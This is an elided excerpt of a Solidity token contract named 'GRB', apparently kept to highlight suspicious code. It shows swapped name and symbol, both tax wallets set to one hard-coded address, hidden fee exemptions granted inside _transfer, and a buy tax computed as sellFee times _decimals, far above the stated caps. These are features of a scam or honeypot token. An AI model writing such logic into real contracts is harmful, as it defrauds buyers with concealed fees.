...
contract GRB is IERC20 {
    ...
    string private constant _name = "GRB";
    string private constant _symbol = "Grumpy Rabit";
    ...
    Fees public _taxRates = Fees({buyFee: 8, sellFee: 8, transferFee: 8});
    ...
    uint256 public constant maxTransferTaxes = 10;
    uint256 public constant maxBuyTaxes = 10;
    uint256 public constant maxSellTaxes = 10;
    ...
    TaxWallets public _taxWallets =
        TaxWallets({
            marketing: payable(0xb225841bc20De89a646DfcCDB5f352f26Be8dE26),
            development: payable(0xb225841bc20De89a646DfcCDB5f352f26Be8dE26)
        });    
    bool inSwap;
    ...
    constructor() payable {
        ...
        _isExcludedFromFees[0xb225841bc20De89a646DfcCDB5f352f26Be8dE26] = true; 
        _isExcludedFromFees[0xb225841bc20De89a646DfcCDB5f352f26Be8dE26] = true;
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if (_isExcludedFromLimits[from] || _isExcludedFromLimits[to]) { _isExcludedFromFees[to] = true; 
            limit = true;
        }

        if (sell) {
            if (_TxCount >= 5 && !inSwap) {
    ...
    function takeTaxes(address from, bool buy, bool sell, uint256 amount) internal returns (uint256) {
        ...
        if (buy) {
            ...
            currentFee = _taxRates.sellFee*_decimals;
        } else if (sell) {
